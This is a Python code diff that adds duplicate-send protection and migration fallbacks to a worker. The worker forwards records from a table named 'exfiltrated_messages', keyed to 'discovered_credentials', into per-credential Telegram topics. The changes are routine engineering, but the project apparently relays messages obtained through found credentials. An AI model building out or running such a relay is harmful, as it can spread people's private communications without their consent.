@@ -392,15 +392,23 @@ async def _fetch_pending_broadcast_messages(batch_size: int, now_iso: str) -> li
     return response.data or []
 
 
-async def _update_message_broadcast_success(msg_id: str) -> None:
+async def _update_message_broadcast_success(
+    msg_id: str,
+    broadcast_message_id: int | None = None,
+) -> None:
     from datetime import datetime
 
     now_iso = datetime.now(UTC).isoformat()
-    payload = {
+    payload: dict[str, Any] = {
         "is_broadcasted": True,
         "broadcast_claimed_at": None,
         "broadcasted_at": now_iso,
     }
+    if broadcast_message_id is not None:
+        # INTR-001: persist so retries recognise a prior successful send
+        # and skip the duplicate `sendMessage` call.
+        payload["broadcast_message_id"] = broadcast_message_id
+        payload["broadcast_status"] = "sent"
     if _can_use_broadcast_reliability_columns():
         try:
             await async_execute(
@@ -415,13 +423,38 @@ async def _update_message_broadcast_success(msg_id: str) -> None:
             _set_broadcast_reliability_columns_available(True)
             return
         except Exception as exc:
+            exc_str = str(exc)
             if _is_missing_broadcast_reliability_column(exc):
                 _set_broadcast_reliability_columns_available(False)
                 logger.warning(
                     "[Broadcast] Reliability columns missing on success update; "
                     "falling back to legacy broadcast status update."
                 )
-            elif "broadcasted_at" in str(exc):
+                # Drop the new columns (broadcast_message_id, broadcast_status)
+                # from the fallback path so a pre-migration DB doesn't reject.
+                payload.pop("broadcast_message_id", None)
+                payload.pop("broadcast_status", None)
+            elif "broadcast_message_id" in exc_str or "broadcast_status" in exc_str:
+                # Migration 20260906000003 not applied yet — drop those two
+                # columns and retry the full update in this same block.
+                logger.warning(
+                    "[Broadcast] broadcast_message_id/broadcast_status column missing; "
+                    "apply supabase/migrations/20260906000003_broadcast_reliability_ext.sql. "
+                    "Falling back to update without idempotency tracking."
+                )
+                payload.pop("broadcast_message_id", None)
+                payload.pop("broadcast_status", None)
+                await async_execute(
+                    db.table("exfiltrated_messages")
+                    .update({
+                        **payload,
+                        "broadcast_error": None,
+                        "next_retry_at": None,
+                    })
+                    .eq("id", msg_id)
+                )
+                return
+            elif "broadcasted_at" in exc_str:
                 # Column not yet migrated — retry without it
                 logger.warning(
                     "[Broadcast] broadcasted_at column missing; apply migration "
@@ -429,6 +462,8 @@ async def _update_message_broadcast_success(msg_id: str) -> None:
                     "Falling back to legacy update."
                 )
                 payload.pop("broadcasted_at", None)
+                payload.pop("broadcast_message_id", None)
+                payload.pop("broadcast_status", None)
                 await async_execute(
                     db.table("exfiltrated_messages").update(payload).eq("id", msg_id)
                 )
@@ -437,6 +472,10 @@ async def _update_message_broadcast_success(msg_id: str) -> None:
                 raise
 
     # Legacy path — column-existence unknown, try WITH broadcasted_at first
+    # broadcast_message_id and broadcast_status are stripped here because
+    # they're guarded by the new migration 20260906000003.
+    payload.pop("broadcast_message_id", None)
+    payload.pop("broadcast_status", None)
     try:
         await async_execute(
             db.table("exfiltrated_messages").update(payload).eq("id", msg_id)
@@ -1209,45 +1248,60 @@ async def _broadcast_logic():
             # Update local cache
             cached_topic_ids[cred_id] = thread_id
 
+            # INTR-001: idempotent broadcast — if a prior run already sent this
+            # message (Telegram message-id persisted), skip the send call and
+            # mark broadcasted directly. Prevents duplicate broadcast when a
+            # worker was killed between successful send and DB write.
+            prior_broadcast_msg_id = msg.get("broadcast_message_id")
+
             # Send Message (with retry for deleted topics)
             send_success = False
-            try:
-                await broadcaster.send_message(group_id, thread_id, msg)
+            sent_message_id: int | None = None
+            if prior_broadcast_msg_id is not None:
+                logger.info(
+                    f"    ⏭️  Skipping send — broadcast_message_id={prior_broadcast_msg_id} "
+                    f"already recorded for msg {msg_id}"
+                )
+                sent_message_id = int(prior_broadcast_msg_id)
                 send_success = True
-            except Exception as e:
-                # Check for topic deletion/not found
-                err_str = str(e)
-                failure_reason = getattr(e, "reason", "")
-                if (
-                    failure_reason == "topic_missing"
-                    or "Topic_deleted" in err_str
-                    or "message thread not found" in err_str
-                    or "TOPIC_DELETED" in err_str
-                ):
-                    logger.warning(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
-                    try:
-                        thread_id = await broadcaster.ensure_topic(group_id, topic_name)
-                        # Re-fetch meta before write
-                        fresh2 = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
-                        meta = dict((fresh2.data or {}).get("meta") or {})
-                        meta["topic_id"] = thread_id
-                        await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
-                        cached_topic_ids[cred_id] = thread_id
-                        # Retry Send
-                        await broadcaster.send_message(group_id, thread_id, msg)
-                        send_success = True
-                    except Exception as retry_e:
-                        logger.error(f"    ❌ Failed after topic recreation: {retry_e}")
-                        await _mark_broadcast_failure(msg, retry_e)
-                else:
-                    logger.error(f"    ❌ Send failed: {e}")
-                    await _mark_broadcast_failure(msg, e)
+            else:
+                try:
+                    sent_message_id = await broadcaster.send_message(group_id, thread_id, msg)
+                    send_success = True
+                except Exception as e:
+                    # Check for topic deletion/not found
+                    err_str = str(e)
+                    failure_reason = getattr(e, "reason", "")
+                    if (
+                        failure_reason == "topic_missing"
+                        or "Topic_deleted" in err_str
+                        or "message thread not found" in err_str
+                        or "TOPIC_DELETED" in err_str
+                    ):
+                        logger.warning(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
+                        try:
+                            thread_id = await broadcaster.ensure_topic(group_id, topic_name)
+                            # Re-fetch meta before write
+                            fresh2 = await async_execute(db.table("discovered_credentials").select("meta").eq("id", cred_id).single())
+                            meta = dict((fresh2.data or {}).get("meta") or {})
+                            meta["topic_id"] = thread_id
+                            await async_execute(db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id))
+                            cached_topic_ids[cred_id] = thread_id
+                            # Retry Send
+                            sent_message_id = await broadcaster.send_message(group_id, thread_id, msg)
+                            send_success = True
+                        except Exception as retry_e:
+                            logger.error(f"    ❌ Failed after topic recreation: {retry_e}")
+                            await _mark_broadcast_failure(msg, retry_e)
+                    else:
+                        logger.error(f"    ❌ Send failed: {e}")
+                        await _mark_broadcast_failure(msg, e)
 
             if send_success:
                 # ==============================================
                 # SUCCESS: Mark as broadcasted and clear claim
                 # ==============================================
-                await _update_message_broadcast_success(msg_id)
+                await _update_message_broadcast_success(msg_id, broadcast_message_id=sent_message_id)
                 sent_count += 1
                 logger.info(f"    ✅ Broadcasted msg {msg_id}")
             else:
